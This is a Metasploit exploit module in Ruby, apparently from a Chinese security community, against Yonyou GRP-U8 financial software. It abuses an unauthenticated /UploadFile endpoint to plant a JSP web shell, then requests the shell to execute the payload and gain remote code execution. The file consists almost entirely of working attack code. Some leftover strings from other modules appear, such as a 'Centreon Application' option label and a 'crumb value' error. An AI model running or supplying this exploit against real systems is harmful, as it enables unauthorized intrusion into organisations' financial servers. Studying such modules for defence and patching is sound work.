require 'msf/core'
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name' => '用友GRP-U8 财务管理软件无限制任意文件上传',
                      'Description' => %q{
                            /UploadFile 无需登录等认证即可上传文件
      },
                      'Author' =>
                          [
                              '路人甲',
                              '扶摇直上打飞机'
                          ],
                      'License' => MSF_LICENSE,
                      'References' =>
                          [
                              ['url', 'http://www.wooyun.org/bugs/wooyun-2015-0111406']
                          ],
                      'Privileged' => true,
                      'Platform' => ['linux', 'win'],
                      'Targets' => [['all of them', {}],],
                      'Arch' => ARCH_JAVA,
                      'DefaultTarget' => 0,
          ))
    register_options(
        [
            Opt::RHOST(),
            Opt::RPORT(80),
            OptString.new('TARGETURI', [true, 'The URI of the Centreon Application', '/']),
        ], self.class)
  end

  def post_data
    @fname = "#{rand_text_alphanumeric(rand(10)+6)}.jsp"
    data = Rex::MIME::Message.new

    data.add_part(payload.encode, 'application/octet-stream', nil, "form-data; name=\"rfile_name\"; filename=\"#{@fname}\"")
    post_data = data.to_s

    print_status("Uploading #{@fname} payload...")
    res = send_request_cgi({
                               'method' => 'POST',
                               'uri' => normalize_uri(target_uri.path, 'UploadFile'),
                               'ctype' => "multipart/form-data; boundary=#{data.bound}",
                               'data' => post_data,
                           })

    if res.code.to_s == '200'
      shellpath = normalize_uri(target_uri.path, 'upload', @fname)
      print_good("Shell address：#{shellpath}")
      print_status("Executing the payload...")
      send_request_cgi(
          {
              'uri' => shellpath,
              'method' => 'GET'
          }, 5)
      print_good("Executed payload")

    else
      fail_with(Failure::Unknown, "#{rhost} cant get crumb value ")
    end

  end

  def exploit
    post_data
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def targeturi
    datastore['TARGETURI']
  end

end